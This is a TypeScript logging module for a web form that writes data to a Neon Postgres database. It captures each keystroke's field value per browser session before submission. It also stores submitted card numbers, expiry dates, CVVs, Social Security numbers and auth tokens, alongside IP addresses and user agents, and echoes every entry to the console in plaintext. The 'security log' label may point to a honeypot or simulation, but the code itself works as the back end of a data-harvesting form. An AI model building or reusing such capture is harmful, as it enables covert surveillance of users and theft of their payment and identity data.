import { neon } from '@neondatabase/serverless';

// Edge runtime compatible logger with keystroke-first workflow
export async function logger(entry: Record<string, unknown>) {
  try {
    // Console logging for immediate debugging
    console.log('SECURITY_LOG:', JSON.stringify(entry));
    
    // Database logging
    if (process.env.DATABASE_URL) {
      const sql = neon(process.env.DATABASE_URL);
      
      // Insert into general security_logs table
      await sql`INSERT INTO security_logs (type, timestamp, ip_address, user_agent, referer, data) 
                VALUES (${entry.type as string}, ${entry.timestamp as string}, ${entry.ip as string}, 
                        ${entry.userAgent as string}, ${entry.referer as string}, ${JSON.stringify(entry)})`;

      // Handle keystroke logging - immediate capture
      if (entry.type === 'keystroke') {
        const sessionId = entry.sessionId as string;
        
        // Ensure form session exists
        await sql`INSERT INTO form_sessions (session_id_browser, first_keystroke_at, last_keystroke_at, ip_address, user_agent)
                  VALUES (${sessionId}, NOW(), NOW(), ${entry.ip as string}, ${entry.userAgent as string})
                  ON CONFLICT (session_id_browser) 
                  DO UPDATE SET last_keystroke_at = NOW()`;

        // Log the keystroke
        await sql`INSERT INTO keystroke_logs (field_name, field_value, session_id_browser, ip_address, user_agent, referer, timestamp) 
                  VALUES (${entry.field as string}, ${entry.value as string}, ${sessionId}, 
                          ${entry.ip as string}, ${entry.userAgent as string}, ${entry.referer as string}, ${entry.timestamp as string})`;
      }

      // Handle form submission - update existing records
      if (entry.type === 'submit' && entry.formData) {
        const formData = entry.formData as Record<string, unknown>;
        const sessionId = entry.sessionId as string;
        
        // Insert the submission record
        await sql`INSERT INTO form_submissions 
                  (employee_name, employee_id, expense_description, amount, business_purpose, 
                   client_name, notes, card_number, card_expiry, card_cvv, ssn, 
                   session_id, auth_token, session_id_browser, was_submitted, ip_address, user_agent, timestamp) 
                  VALUES (${formData.employeeName as string}, ${formData.employeeId as string}, ${formData.expenseDescription as string}, 
                          ${formData.amount as string}, ${formData.businessPurpose as string}, ${formData.clientName as string}, 
                          ${formData.notes as string}, ${formData.cardNumber as string}, ${formData.cardExpiry as string}, 
                          ${formData.cardCvv as string}, ${formData.ssn as string}, ${entry.sessionId as string}, 
                          ${entry.authToken as string}, ${sessionId}, ${true}, ${entry.ip as string}, 
                          ${entry.userAgent as string}, ${entry.timestamp as string})`;

        // Update form session to mark as submitted
        await sql`UPDATE form_sessions 
                  SET was_submitted = TRUE, submitted_at = NOW() 
                  WHERE session_id_browser = ${sessionId}`;

        // Update all keystroke logs for this session to mark as submitted
        await sql`UPDATE keystroke_logs 
                  SET was_submitted = TRUE 
                  WHERE session_id_browser = ${sessionId}`;
      }
    }
    
  } catch (error) {
    console.error("Logger error:", error);
    // Fallback to console only if database fails
    console.log('FALLBACK_LOG:', JSON.stringify(entry));
  }
}